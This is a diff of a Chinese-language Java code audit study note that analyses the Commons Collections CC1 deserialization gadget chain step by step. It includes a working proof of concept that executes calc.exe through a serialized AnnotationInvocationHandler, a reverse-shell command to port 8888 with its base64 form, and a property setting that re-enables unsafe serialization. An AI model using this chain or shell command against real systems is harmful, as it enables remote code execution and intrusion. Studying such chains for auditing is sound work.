@@ -11,6 +11,8 @@
 > 《Java代码审计（入门篇）》
 >
 > java漏洞复现：https://github.com/threedr3am/learnjavabug
+>
+> jdk8历史版本 https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
 
 ## 学习路线：
 
@@ -28,6 +30,8 @@
   - 强烈推荐下列辅助工具：
     1. `Jetbrains IDEA(IDE)`
     2. `Visual Studio Code`
+    3. `codeql`
+    4. 
 
 ### Java类编译与反编译基础
 
@@ -240,6 +244,7 @@
       }
   }
   ```
+  
 - 执行结果，弹出计算器。
 - 远程的cmd.jar中就一个CMD.class文件，对应的编译之前的代码片段如下：
 
@@ -274,7 +279,6 @@
   - 获取字节码文件对象的四种方式，有了字节码文件对象才能获得类中所有的信息，我们在使用反射获取信息时，也要考虑使用下面哪种方式获取字节码对象合理，视不同情况而定。
 
     - Class.forName(）
-
       ```java
       Class clazz1 = Class.forName("my.Student");
       //通过Class类中的静态方法forName，直接获取到一个类的字节码文件对象，此时该类还是源文件阶段，并没有变为字节码文件。包名为 my，类名为 Student。
@@ -441,8 +445,6 @@
           }
       }
   }
-
-
   ```
 - 反射调用Runtime实现本地命令执行的流程如下：
 
@@ -461,22 +463,22 @@
 
   ```java
   package test;
-
+  
   import java.io.IOException;
   import java.lang.reflect.InvocationTargetException;
   import java.util.Arrays;
   import java.util.List;
-
+  
   public class ProcessDemo {
       public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
-
+  
           Class clazz = Class.forName("java.lang.ProcessBuilder");
           ((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();
-
+  
       }
   //Arrays.asList(),用于转换成list集合
   }
-
+  
   ```
 - ProcessBuilder有两个构造函数：
 
@@ -596,12 +598,10 @@
 
 -  一般常用的是使用base64来编码我们输入的命令
 
-    - ```
         原始 bash -c "bash -i >& /dev/tcp/1.1.1.1/8888 0>&1"
         
         编码后 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzg4ODggMD4mMSA=}|{base64,-d}|{bash,-i}
         直接在linux shell下运行失败，猜测-c后面的参数被java做了一些处理
-        ```
 
 分析
 
@@ -839,279 +839,645 @@
   }
   ```
 
-### 反序列化漏洞
+### 反序列化漏洞原理
 
 - 2015年[Apache Commons Collections反序列化漏洞](https://issues.apache.org/jira/browse/COLLECTIONS-580)([ysoserial](https://github.com/frohoff/ysoserial)的最早的commit记录是2015年1月29日）
-- **反序列化漏洞的产生，就是该类继承重写了 Serializable 或 Externalizable 接口并重写readObject方法，而且这个readObject方法中有可以利用的代码。**和php反序列会执行__wakeup()一样。
-- **我们需要找到一个类，这个类重写了readObject方法，并且该方法存在漏洞，使得我们可以利用。**
+
+- **反序列化漏洞的产生，就是该类继承重写了 Serializable 或 Externalizable 接口并重写readObject方法，而且这个readObject方法中有可以利用的代码。**和php反序列会执行__wakeup()一样。**我们需要找到一个类，这个类重写了readObject方法，并且该方法存在漏洞，使得我们可以利用。**
+
+- 如何寻找可RCE的Gadget？
+    - 第一，一条完整的链，需要有入口，有出口，还有中间过程。入口就是入口类，专业术语叫**source**，必须要重写readObject()方法：出口就是这条链子走完到最后产生的结果是啥，这是由最后这个类所执行的方法决定的，出口就是执行类，专业术语叫**sink**,中间过程就是调用链，专业术语**gadget chain**，经过层层套娃，顺利地从入口类的readObject()方法走到执行类的某个方法，这是最繁琐的过程，可能找了半天，构造了半天，最后发现不行。
+    - 第二，**这条链子上的类都要实现Serializable或者Externalizable:接口**：其次，要具备比较通用的特点，那这条链上的类**最好是jdk自带或者JAVA常用组件里有的**。
+    - 第三，**入口类**，**构造该类对象和调用其方法时参数类型广泛最好是Object类型，方便我们传入对象：且readObject()方法中调用常见方法，结合参数类型广泛和调用常见方法这两点，我们才好从入口类的readObject()方法进入到另一个类的方法。**
+    - 第四，调用链，前一个类中代码调用的方法在后一个类中有，且前一个类的方法的参数类型为后一个类的类型，简单的说就是**相同方法名，相同类型**（比如CC1链中就是一系列实现了Transformer接口的类，调用类的transform()方法）
+    - 第五，**执行类**，这是最重要的。费了那么大劲，最后产生的危害有多大就看这个了。危害可以是SSRF、写文件、拒绝服务等，当然我们最希望的是RCE。
+
+- 总结：
+
+    - ```
+        共同条件：实现Serializable或者Externalizable:接口，jdk自带或者JAVA常用组件里有的
+        入口类source，（重写readObject 调用常见函数，参数类型广泛，最好jdk自带）
+        调用链 gadger chain：相同方法名，相同类型
+        执行类sink：RCE SSRF 写文件等
+        ```
+
+- 思路
+
+    - 那么我们要找一条可 RCE 的链子，最后的执行类应当可以调用 Runtime.getRuntime().exec()这种危险方法，要么就是它里面自己写有了这个危险方法， 要么就是我们可以控制某些参数，调用任意对象的任意方法。
+    - 入口自然是某个类的 readObject()方法。
+    -  那么首先，我们得要找到符合条件的一个执行类，然后通过 IDEA 的 find usages，go to 这样的功能倒回去找，看哪个类(A)的某个方法（a()）调用了执行类的危险方法，哪个类(B) 的某个方法（b()）调用了 A.a()方法.......，要求这些类都可序列化，最好是参数类型广 泛（比如 Map 系列），或者类型兼容（都继承自某个类或实现了某个接口）。而倒回去找到 的方法优先选择 readObject()。
+    -  上面就是我们分析的思路了，下面就来进行CC1 链的分析。
+
 - **Apache Commons Collections：**
 
-  - Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。
+  - Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库，**它提供了很多强有力的数据结构类型并且实现了各种集合工具类**。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。
   - 这个框架中有一个InvokerTransformer.java接口，实现该接口的类可以通过调用java的反射机制来调用任意函数，于是我们可以通过调用Runtime.getRuntime.exec() 函数来执行系统命令。
   - Apache commons  collections包的广泛使用，也导致了java反序列化漏洞的大面积流行。
-  - TransformedMap类: **扩展的Map类**
 
-    - 感觉像个高阶函数，传入transform函数对传入的字典Map进行修改。
-    - **Commons  Collections 实现了一个TransformedMap类，该类是对Java标准数据结构Map(也就是python的字典，有key和value)接口的一个扩展**。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。
-    - 我们可以通过TransformedMap.decorate()方法，获得一个TransformedMap的实例。如下代码是TransformedMap.decorate()方法
+- **网上公开的 CC1 链有两条，分别是利用 TransformedMap和LazyMap类。首先分析 TransformedMap链，这条链子比较简单。**
 
-      ```java
-      public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
-        return new TransformedMap(map, keyTransformer, valueTransformer);
-      }
-      ```
-  - Transformer接口：
+### cc1—TransformedMap链
 
-    - Transformer是一个接口，其中定义的transform()函数用来将一个对象转换成另一个对象。有个特定的Transformer可以反射执行系统命令。
+> 沃克 Walker师傅
 
-      ```java
-      public interface Transformer {  
-        public Object transform(Object input);
-      }
-      ```
-    - 当TransformedMap中的任意项的Key或者Value被修改，相应的Transformer的transform()方法就会被调用。除此以外，**多个Transformer还能串起来，形成反射链ChainedTransformer，然后当作Transformer参数传入即可。**
-    - Apache Commons  Collections中已经实现了一些常见的 Transformer，其中的 InvokerTransformer 接口实现了反射链，可以通过Java的反射机制来执行任意命令。于是我们可以通过**InvokerTransformer的反射链获得Runtime类**来执行系统命令 。
-  - 一个简化版的CommonCollections1：
+#### 环境搭建
+
+- **注意CC1链的条件是：Commons-Collections <= 3.2.1， jdk<8u71**。我 IDEA 中用的版本为 1.8.0_65。另外该链 中需要用到 sun 包中的类，而 sun 包在 jdk 中的代码是通过 class 文件反编译来的，不是 java 文件，不能进行调试，通过 find usages 是搜不到要找的类的，而且其代码中的对象 是 var 这样的形式，影响代码的阅读。
+
+- 故需下载对应的 openjdk 源码，解压后可得到 sun 包源码，解压 jdk 目录的 src.zip，将 sun 包源码拷贝过去：（[如何下载各个版本的openjdk源码](https://cloud.tencent.com/developer/article/1413521)）（下载的 openjdk 版本其实与我的 jdk 并不完全匹配，但不影响分析）
+
+    - ```cmd
+        (base) PS D:\app\JAVA\jdk1.8.0_65\src> ls
+        
+        目录: D:\app\JAVA\jdk1.8.0_65\src
+        
+        Mode                 LastWriteTime         Length Name
+        ----                 -------------         ------ ----
+        d-----        2022/10/27     11:18                com
+        d-----        2022/10/27     11:18                java
+        d-----        2022/10/27     11:18                javax
+        d-----        2022/10/27     11:19                launcher
+        d-----        2022/10/27     11:19                org
+        d-----        2022/10/27     11:57                sun
+        ```
+
+- 默认里面是没有 sun 包的，这是我拷贝过去的。然后在 IDEA 中，File-->Project Structure- ->SDKs 将 src 目录的路径加到 Sourcepath 中去
+
+    - ![image-20221027115941858](./java代码审计.assets/image-20221027115941858.png)
+
+- ```xml
+    <dependency>
+        <groupId>commons-collections</groupId>
+        <artifactId>commons-collections</artifactId>
+        <version>3.2.1</version>
+    </dependency>
+    ```
+
+- 因为安全机制高版本（3.2.2版本及以上）`org.apache.commons.collections.functors.InvokerTransformer`类无法使用
+
+    - 在java代码中使用下列命令，可以在3.22版本启动该方法
+
+        ````java
+        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
+        ````
+
+#### 漏洞分析
+
+##### **sink类—Transformer接口：**
+
+- 起点是一个 Transformer 接口，位于 org.apache.commons.collections 包中：
+
+    
 
     ```java
-    package test;
+    public interface Transformer {
+    
+        /**
+         * Transforms the input object (leaving it unchanged) into some output object.
+         *
+         * @param input  the object to be transformed, should be left unchanged
+         * @return a transformed object
+         * @throws ClassCastException (runtime) if the input is the wrong class
+         * @throws IllegalArgumentException (runtime) if the input is invalid
+         * @throws FunctorException (runtime) if the transform cannot be completed
+         */
+        public Object transform(Object input);
+    
+    }
+    ```
+
+- transform 意为转换，转化，transformer 可理解为转换器、修饰器的意思。只有一个 transform()方法，根据介绍可知道其作用是对传入的对象进行修饰，不改变其类型。来看 看有哪些类实现了这个接口：
+
+- ![image-20221028181446442](./java代码审计.assets/image-20221028181446442.png)
+
+- 显示 21 个其实也就14个，BeanMap 是重复的，我们可以逐个打开看看它们的 transform()方法都有什么用。其中，之后会用到的类会有这么几个：
+
+- **ChainedTransformer**
+
+    - ```java
+        public class ChainedTransformer implements Transformer, Serializable {
+        
+            /** Serial version UID */
+            private static final long serialVersionUID = 3514945074733160196L;
+        
+            /** The transformers to call in turn */
+            private final Transformer[] iTransformers;   
+            
+        	/**
+             * Transforms the input to result via each decorated transformer
+             * 
+             * @param object  the input object passed to the first transformer
+             * @return the transformed result
+             */
+            public Object transform(Object object) {
+                for (int i = 0; i < iTransformers.length; i++) {
+                    object = iTransformers[i].transform(object);
+                }
+                return object;
+            }
+        }
+        ```
+
+    - 该类维护了一个 Transformer 接口类型的数组 iTransformers，transform 方法是先将输入 的对象交给 iTransformers 数组的第一个转换器的 transform()方法进行修饰，修饰后的 结果又作为下一个转化器的 transform()方法要修饰的对象，简单来说就是当前的结果作 为下一个步骤的输入，将最后的结果返回。有一种链式反应的感觉。
+
+- **ConstantTransformer**
+
+    - ```java
+        /*
+         *  Licensed to the Apache Software Foundation (ASF) under one or more
+         *  contributor license agreements.  See the NOTICE file distributed with
+         *  this work for additional information regarding copyright ownership.
+         *  The ASF licenses this file to You under the Apache License, Version 2.0
+         *  (the "License"); you may not use this file except in compliance with
+         *  the License.  You may obtain a copy of the License at
+         *
+         *      http://www.apache.org/licenses/LICENSE-2.0
+         *
+         *  Unless required by applicable law or agreed to in writing, software
+         *  distributed under the License is distributed on an "AS IS" BASIS,
+         *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+         *  See the License for the specific language governing permissions and
+         *  limitations under the License.
+         */
+        package org.apache.commons.collections.functors;
+        
+        import java.io.Serializable;
+        
+        import org.apache.commons.collections.Transformer;
+        
+        /**
+         * Transformer implementation that returns the same constant each time.
+         * <p>
+         * No check is made that the object is immutable. In general, only immutable
+         * objects should use the constant factory. Mutable objects should
+         * use the prototype factory.
+         * 
+         * @since Commons Collections 3.0
+         * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $
+         *
+         * @author Stephen Colebourne
+         */
+        public class ConstantTransformer implements Transformer, Serializable {
+        
+            /** Serial version UID */
+            private static final long serialVersionUID = 6374440726369055124L;
+            
+            /** Returns null each time */
+            public static final Transformer NULL_INSTANCE = new ConstantTransformer(null);
+        
+            /** The closures to call in turn */
+            private final Object iConstant;
+        
+        
+            /**
+             * Constructor that performs no validation.
+             * Use <code>getInstance</code> if you want that.
+             * 
+             * @param constantToReturn  the constant to return each time
+             */
+            public ConstantTransformer(Object constantToReturn) {
+                super();
+                iConstant = constantToReturn;
+            }
+        
+            /**
+             * Transforms the input by ignoring it and returning the stored constant instead.
+             * 
+             * @param input  the input object which is ignored
+             * @return the stored constant
+             */
+            public Object transform(Object input) {
+                return iConstant;
+            }
+        ```
+
+    - 该类维护了一个 iConstant 恒定不变的 Object 对象，是由创建时通过构造器传入，其 transform 方法是无视传入的对象，直接返回该 iConstant。所以叫 ConstantTransformer 。
+
+
+**InvokerTransformer（执行类）**：
+
+- ```java
+  /**
+   * Transformer implementation that creates a new object instance by reflection.
+   * 
+   * @since Commons Collections 3.0
+   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $
+   *
+   * @author Stephen Colebourne
+   */
+  public class InvokerTransformer implements Transformer, Serializable {
+  
+      /** The serial version */
+      private static final long serialVersionUID = -8653385846894047688L;
+      
+      /** The method name to call */
+      private final String iMethodName;
+      /** The array of reflection parameter types */
+      private final Class[] iParamTypes;
+      /** The array of reflection arguments */
+      private final Object[] iArgs;
+     
+      /**
+       * Constructor for no arg instance.
+       * 
+       * @param methodName  the method to call
+       */
+      private InvokerTransformer(String methodName) {
+          super();
+          iMethodName = methodName;
+          iParamTypes = null;
+          iArgs = null;
+      }
+  
+      /**
+       * Constructor that performs no validation.
+       * Use <code>getInstance</code> if you want that.
+       * 
+       * @param methodName  the method to call
+       * @param paramTypes  the constructor parameter types, not cloned
+       * @param args  the constructor arguments, not cloned
+       */
+      public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
+          super();
+          iMethodName = methodName;
+          iParamTypes = paramTypes;
+          iArgs = args;
+      }
+  
+  
+  /**
+       * Transforms the input to result by invoking a method on the input.
+       * 
+       * @param input  the input object to transform
+       * @return the transformed result, null if null input
+  */
+  public Object transform(Object input) {
+      if (input == null) {
+          return null;
+      }
+      try {
+          Class cls = input.getClass();
+          Method method = cls.getMethod(iMethodName, iParamTypes);
+          return method.invoke(input, iArgs);
+  
+      } catch (NoSuchMethodException ex) {
+          throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
+      } catch (IllegalAccessException ex) {
+          throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
+      } catch (InvocationTargetException ex) {
+          throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
+      }
+  }
+      
+  }
+  ```
+
+- 该类的 transform 方法是通过反射获取我们所传入的对象的方法，然后进行调用（public 访问修饰的方法），故而叫 InvokerTransformer。其中的对象、方法名、 参数类型、参数都类型广泛，且都由我们控制，可调用任意对象的任意方法 我们很容易就写出下面的代码来弹计算器：
+
+  - ```java
+    import org.apache.commons.collections.functors.InvokerTransformer;
+    
+    public class CC1 {
+        public static void main(String[] args) {
+            InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
+            invokerTransformer.transform(Runtime.getRuntime());
+        }
+    }
+    
+    ```
+
+##### 寻找Gadget—TransformedMap类
+
+- **按照思路，执行类找到了，接下来就要去找哪个类中有方法调用了**
+
+- **`InvokerTransformer.transform()`这个危险方法，通过 find usages 来看下：**
+
+- ![image-20221028191434813](./java代码审计.assets/image-20221028191434813.png)
+
+可以看到库中有17个方法，那哪些方法合适呢？
+
+- 要求是要**能序列化**，参数类型广泛，优先 readObject()。**我们的transformers对象要能传入到这个类当中（类的构造函数或者当前方法有这个参数）。**且方法名不应是 transform()，因为如果方法名是 transform()，那不就嵌套了吗，那我们找到的这个函数就没法调用了。
+- 最后找到的6个类![image-20221028193318680](./java代码审计.assets/image-20221028193318680.png)
+
+- 对应方法为
+
+    - ```java
+        TransformedPredicate.ecaluate()
+        TransformerClosure.ecaluate()
+        TransformerPredicate.ecaluate()
+        DefaultedMap.get()
+        LazyMap.get()
+        TransformedMap.transformKey()
+        TransformedMap.transformValue()
+        TransformedMap.checkSetValue()
+        ```
+
+- 按照考量，我们优先选择 TransformedMap。首先它是 Map 系列，其次有多个方法调用到 transform()，机会更多。
+
+**TransformedMap类: 扩展的Map类**
+
+- **Commons  Collections 实现了一个TransformedMap类，该类是对Java标准数据结构Map(也就是python的字典，有key和value)接口的一个扩展**。**该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义**，Transformer在TransformedMap实例化时作为参数传入。
+
+- 通过 keyTransformer 和 valueTransformer 的 transform()方法分别对键和值进行修饰，这两个可由我们控制传入，只要是 Transformer 类型就行。其构造器是 protected 的，不能直接 new，但我们可以通过 pubulic 访问属性的静态方法 decorate()来获得对象实例。
+
+    - ```java
+        protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+            super(map);
+            this.keyTransformer = keyTransformer;
+            this.valueTransformer = valueTransformer;
+        }
+        
+        public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+            return new TransformedMap(map, keyTransformer, valueTransformer);
+        }
+        ```
+
+- 我们让传入的 valueTransformer 为 InvokerTransformer 对象，put 时传入的 value 为 Runtime.getRuntime(),key 任意，很容易就写出下面的代码来弹计算器：
+
+    - ```java
+        import org.apache.commons.collections.functors.InvokerTransformer;
+        import org.apache.commons.collections.map.TransformedMap;
+        import java.util.HashMap;
+        import java.util.Map;
+        
+        public class CC1 {
+            public static void main(String[] args) {
+                InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
+                Map map = new HashMap();
+                Map transformedMap = TransformedMap.decorate(map, null, invokerTransformer);
+                transformedMap.put(1,Runtime.getRuntime());
+            }
+        }
+        ```
+
+- 接下来我们就要找哪个类的方法中调用到了 `TransformedMap` 的这三个方法，其中 `transformkey()`和 `transformValue()`只在本类中进行了调用(**put方法，transformMap方法**)，`checkSetValue()`方法只在 抽象类 AbstractInputCheckedMapDecorator 的静态内部类 **MapEntry 的 setValue()方法**中 进行了调用：
+
+    - ```java
+            static class MapEntry extends AbstractMapEntryDecorator {
+        
+                /** The parent map */
+                private final AbstractInputCheckedMapDecorator parent;
+        
+                protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
+                    super(entry);
+                    this.parent = parent;
+                }
+        
+                public Object setValue(Object value) {
+                    value = parent.checkSetValue(value);
+                    return entry.setValue(value);
+                }
+            }
+        ```
+
+- AbstractInputCheckedMapDecorator 是 TransformedMap 的父类。对 HashMap 比较熟悉的 话对 Map.Entry 一定也不会陌生。 这里简单说一下，我们知道 Map 是用来存放键值对的，HashMap 中一对 k-v 是存放在 HashMap$Node 中的，而 Node 又实现了 Entry 接口，所以可以粗略地认为 k-v 是存放在 Entry 中的，遍历 Map 时,可以通过 entrySet()方法获取到一对对的 k-v（Map.Entry 类 型）。
+
+- 如下代码，通过遍历 TransformedMap，再使用 setValue()传入 Runtime.getRuntime()就可以弹计算器，想想这是为什么？
+
+    - ```java
+        import org.apache.commons.collections.functors.InvokerTransformer;
+        import org.apache.commons.collections.map.TransformedMap;
+        import java.util.HashMap;
+        import java.util.Map;
+        
+        public class CC1 {
+            public static void main(String[] args) {
+                InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
+                Map map = new HashMap();
+                Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);
+                for (Map.Entry entry:transformedMap.entrySet()){
+                    entry.setValue(Runtime.getRuntime());
+                }
+            }
+        }
+        ```
+
+##### 寻找Source类-AnnotationInvocationHandler类
+
+- **目前的构造还需要依赖于修改Map中的Value值或者key去触发调用反射链，我们需要想办法通过readObject()直接触发。**
+- **如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map参数是可控的，那么就有反序列化漏洞了。**
+- 再接着找谁调用了这个 setValue()方法，并且在readObject()函数里面：
+    - ![image-20221028201638270](./java代码审计.assets/image-20221028201638270.png)
+
+- 此处找到可能的入口：AnnotationInvocationHandler.readObject()，这个类在 sun.reflect.annotation 包中!
+
+**AnnotationInvocationHandler类**
+
+- JDK 版本有要求，需在 `8u71` 之前，8u71之后AnnotationInvocationHandler 在重写的 readObject() 方法中移除了 memberValue.setValue的调用，也就没有漏洞了。
+
+- 看这个类代码好像有点复杂，我们先看下构造函数，需要传入一个 Map 对象 memberValues,
+
+- readObject()方法中重点看 for 循环，首先会对反序列化出来的 memberValues 进行遍历，然后会进行一些 if 语句的判断，满足条件就会调用 setValue 方 法，而 setValue 的参数似乎不是我们能控制的。有没有什么办法解决？
+
+- 其次，Runtime 这 个类是不可序列化的，怎么能加入到序列化与反序列化过程中去呢？第三， AnnotationInvocationHandler 这个类不是 public 的，构造器也不是 public 的，不能直 接创建，怎么解决？后面会讲解，下面来捋捋我们的整个过程。
+
+    - 首先我们找到了 Transformer 接口的实现类 InvokerTransformer 作为执行类，它的 transform()方法是通过反射获取我们所传入对象的方法，然后进行调用（需 public 访问 修饰的方法）,其中的对象、方法名、参数类型、参数都类型广泛，且都可以由我们控制， 可以调用任意对象的任意方法，这是核心点
+    - 之后我们找到 TransformedMap 的 checkSetvalue()方法会调用 transform(),而 checkSetvalue()会在 AbstractInputCheckedMapDecorator 的静态内部类 MapEntry 的 setValue()中调用，TransformedMap 继承自 AbstractInputCheckedMapDecorator，所以前面我们通过遍历 TransformedMap 得到 Map.Entry 再调用 setValue()就会弹计算器。
+    - 在 AnnotationInvocationHandler 的 readObject()方法中若满足一定条件会调用 setValue() 方法。 以上是对逆推找 Gadget 的过程总结，
+
+- **setValue 的参数不是我们能控制的，怎么解决？**
+
+    - ChainedTransformer 和 ConstantTransformer。创建一个 ConstantTransformer 对象，直接传入 iConstant 为 Runtime.getRuntime()，放置在 ChainedTransformer 的 iTransformers 数组的第一个，原 先的 InvokerTransformer 对象放在第二个，ChainedTransformer 传入到 valueTransformer。这样不管 value 为多少，最终都能弹计算器。
+
+- **Runtime 不可序列化问题** ？
+
+    - 利用反射来解决，因为 Class 这个类是可序列化的：
+
+        - ```java
+            public final class Class<T> implements java.io.Serializable,
+                                          GenericDeclaration,
+                                          Type,
+                                          AnnotatedElement {
+            ```
+
+    - 通过反射，获取 Runtime 的 class 对象，就可将其变成可序列化的。将 Runtime.getRuntime().exec()写成反射形式就是：
+
+        - ```java
+            import java.io.IOException;
+            import java.lang.reflect.InvocationTargetException;
+            import java.lang.reflect.Method;
+            
+            public class CC1 {
+                public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {
+                    Class runtimeClass = Runtime.class;
+                    Method method = runtimeClass.getMethod("getRuntime", null);
+                    Runtime r = (Runtime) method.invoke(null, null);
+                    r.exec("calc");
+                }
+            }
+            ```
+
+        - 转化为 Transformers 就是:
+
+            - ```java
+                Transformer[] transformers = new Transformer[]{
+                                new ConstantTransformer(Runtime.class),
+                                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+                                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})};
+                        }
+                ```
+
+- AnnotationInvocationHandler 类是非 public 的，如何引入呢（不引入没法写poc）？
+
+    - **反射调用就行**
+
+    - ```java
+        AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
+                Class<?>[] superInterfaces = type.getInterfaces();
+                if (!type.isAnnotation() ||
+                    superInterfaces.length != 1 ||
+                    superInterfaces[0] != java.lang.annotation.Annotation.class)
+                    throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
+                this.type = type;
+                this.memberValues = memberValues;
+            }
+        ```
+
+    - 其构造器是要传入一个 Annotation 子类（注解类）的 class 对象 type 和一个 map 对象 memberValues(我们传入构造好的 TransformedMap)。
+
+    - 先来看 readObject()的前半段：
+
+        - ```java
+            private void readObject(java.io.ObjectInputStream s)
+                    throws java.io.IOException, ClassNotFoundException {
+                    s.defaultReadObject();
+            
+                    // Check to make sure that types have not evolved incompatibly
+            
+                    AnnotationType annotationType = null;
+                    try {
+                        annotationType = AnnotationType.getInstance(type);
+                    } catch(IllegalArgumentException e) {
+                        // Class is no longer an annotation type; time to punch out
+                        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
+                    }
+            
+                    Map<String, Class<?>> memberTypes = annotationType.memberTypes();
+            ```
+
+        - 我们跟进 AnnotationType 来看下：
+
+        - 根据注释结合 readObject()的前半段代码来看，AnnotationInvocationHandler 对象在反 序列化时会通过 getInstance 获取注解的实例来检查反序列化出来的 type 是否合法，不合 法抛出异常，合法就通过 memberTypes()是获取其成员类型（其实就是注解的方法名和返回类 型），存储在 HashMap>中。
+
+        - 重点还是 for 循环：
+
+            - ```java
+                for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
+                    String name = memberValue.getKey();
+                    Class<?> memberType = memberTypes.get(name);
+                    if (memberType != null) {  // i.e. member still exists
+                        Object value = memberValue.getValue();
+                        if (!(memberType.isInstance(value) ||
+                                value instanceof ExceptionProxy)) {
+                            memberValue.setValue(
+                                new AnnotationTypeMismatchExceptionProxy(
+                                    value.getClass() + "[" + value + "]").setMember(
+                                        annotationType.members().get(name)));
+                }
+                
+                ```
+
+        - 遍历反序列化出来的 TransformedMap，逐个获取键名，
+
+        - 第一个 if 表达的意思是若该键名 与 注解实例 的某个方法名相同，则获取该键名的值。
+
+        - 第二个 if 表达的意思是若注解实例方法的返回类型不是键名对应的值的实例 或者 键名对应的值是 ExceptionProxy 的实例，则 修改键名对应的值。
+
+        - 显然第二个 if 很容易满足，第一个 if 只要遍历出来的TransformedMap 的键名与所传入注解的方法名相同就满足。
+
+        - 注解类有很多:
+
+            - ![image-20221028210746657](./java代码审计.assets/image-20221028210746657.png)
+
+            - 随便找一个成员不为空的就行，因为键名是我们可以控制的。比如，我找的 Target 注解中有 value 方法，返回类型是ElementType[]：
+
+                - ```java
+                    @Documented
+                    @Retention(RetentionPolicy.RUNTIME)
+                    @Target(ElementType.ANNOTATION_TYPE)
+                    public @interface Target {
+                        /**
+                         * Returns an array of the kinds of elements an annotation type
+                         * can be applied to.
+                         * @return an array of the kinds of elements an annotation type
+                         * can be applied to
+                         */
+                        ElementType[] value();
+                    }
+                    ```
+
+            - 将键名设为 value 就行。最后再加入序列化和反序列化可得完整代码
+
+- 测试代码
+
+    ```java
+    package cc;
+    
     
     import org.apache.commons.collections.Transformer;
-    import org.apache.commons.collections.functors.ChainedTransformer;
     import org.apache.commons.collections.functors.ConstantTransformer;
     import org.apache.commons.collections.functors.InvokerTransformer;
-    import org.apache.commons.collections.map.TransformedMap;
     
+    import java.io.*;
+    import java.lang.annotation.Target;
+    import java.lang.reflect.Constructor;
     import java.util.HashMap;
     import java.util.Map;
     
-    // 代码来自p神的知识星球
-    public class Collections {
-        public static void main(String[] args) throws Exception {
-            Transformer[] transformers = new Transformer[]{
-                    new ConstantTransformer(Runtime.getRuntime()),
-                    new InvokerTransformer("exec", new Class[]{String.class},
-                            new Object[]{"calc"}),
-            };
+    import org.apache.commons.collections.functors.ChainedTransformer;
+    import org.apache.commons.collections.map.TransformedMap;
     
-            Transformer transformerChain = new
-                    ChainedTransformer(transformers);
-            Map innerMap = new HashMap();
-            Map outerMap = TransformedMap.decorate(innerMap, null,
-                    transformerChain);
-            outerMap.put("test", "xxxx");
+    public class CC1 {
+        public static void main(String[] args) throws Exception{
+            Transformer[] transformers = new Transformer[] {
+                    new ConstantTransformer(Runtime.class),
+                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                    new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})};
+    
+            Transformer transformedChain = new ChainedTransformer(transformers);  //实例化一个反射链
+    
+            Map innerMap = new HashMap();   //实例化一个Map对象
+            innerMap.put("value", "value");
+    
+            Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain); //将Map对象和反射链作为参数传入
+    
+            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  //得到 AnnotationInvocationHandler类的字节码文件
+            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+            ctor.setAccessible(true);
+            Object instance = ctor.newInstance(Target.class, outerMap);  //得到我们构造好的 AnnotationInvocationHandler类实例
+    
+            FileOutputStream f = new FileOutputStream("./test.txt");
+            ObjectOutputStream out = new ObjectOutputStream(f);  //创建一个对象输出流
+            out.writeObject(instance);  //将我们构造的 AnnotationInvocationHandler类进行序列化
+            out.flush();
+            out.close();
+            //开始反序列化test.txt文件
+            Unser();
+        }
+    
+        public static void Unser() throws IOException,ClassNotFoundException{
+            FileInputStream in = new FileInputStream("./test.txt");   //实例化一个文件输入流
+            ObjectInputStream ins = new ObjectInputStream(in);      //实例化一个对象输入流
